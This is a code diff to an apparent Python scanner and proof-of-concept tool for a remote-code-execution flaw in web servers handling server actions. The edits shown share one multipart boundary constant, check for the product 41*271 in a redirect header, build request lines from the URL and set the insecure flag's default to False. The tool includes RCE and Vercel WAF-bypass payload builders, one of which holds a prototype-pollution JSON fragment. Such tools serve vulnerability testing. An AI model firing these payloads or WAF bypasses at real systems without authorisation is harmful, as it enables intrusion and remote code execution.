@@ -51,6 +51,13 @@ class Colors:
     RESET = "\033[0m"
 
 
+# Multipart boundary used across payload builders
+BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+
+# Deterministic math result used by the PoC (41*271)
+EXPECTED_RESULT = str(41 * 271)
+
+
 def colorize(text: str, color: str) -> str:
     """Apply color to text."""
     return f"{color}{text}{Colors.RESET}"
@@ -98,7 +105,7 @@ def generate_junk_data(size_bytes: int) -> tuple[str, str]:
 
 def build_safe_payload() -> tuple[str, str]:
     """Build the safe multipart form data payload for the vulnerability check (side-channel)."""
-    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+    boundary = BOUNDARY
 
     body = (
         f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
@@ -116,7 +123,7 @@ def build_safe_payload() -> tuple[str, str]:
 
 def build_vercel_waf_bypass_payload() -> tuple[str, str]:
     """Build the Vercel WAF bypass multipart form data payload."""
-    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+    boundary = BOUNDARY
 
     part0 = (
         '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
@@ -148,7 +155,7 @@ def build_vercel_waf_bypass_payload() -> tuple[str, str]:
 
 def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
     """Build the RCE PoC multipart form data payload."""
-    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+    boundary = BOUNDARY
 
     if windows:
         # PowerShell payload - escape double quotes for JSON
@@ -287,7 +294,8 @@ def is_vulnerable_rce_check(response: requests.Response) -> bool:
     """Check if a response indicates vulnerability (RCE PoC check)."""
     # Check for the X-Action-Redirect header with the expected value
     redirect_header = response.headers.get("X-Action-Redirect", "")
-    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))
+    pattern = r'.*/login\?a=' + re.escape(EXPECTED_RESULT) + r'.*'
+    return bool(re.search(pattern, redirect_header))
 
 
 def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: Optional[dict[str, str]] = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False, paths: Optional[list[str]] = None) -> dict:
@@ -351,7 +359,11 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
 
     def build_request_str(url: str) -> str:
         parsed = urlparse(url)
-        req_str = f"POST {'/aaa' or '/aaa'} HTTP/1.1\r\n"
+        # Build a realistic request-line using the path and query from the URL
+        path = parsed.path or "/"
+        if parsed.query:
+            path = f"{path}?{parsed.query}"
+        req_str = f"POST {path} HTTP/1.1\r\n"
         req_str += f"Host: {parsed.netloc}\r\n"
         for k, v in headers.items():
             req_str += f"{k}: {v}\r\n"
@@ -574,7 +586,7 @@ Examples:
 
     parser.add_argument(
         "-k", "--insecure",
-        default=True,
+        default=False,
         action="store_true",
         help="Disable SSL certificate verification"
     )
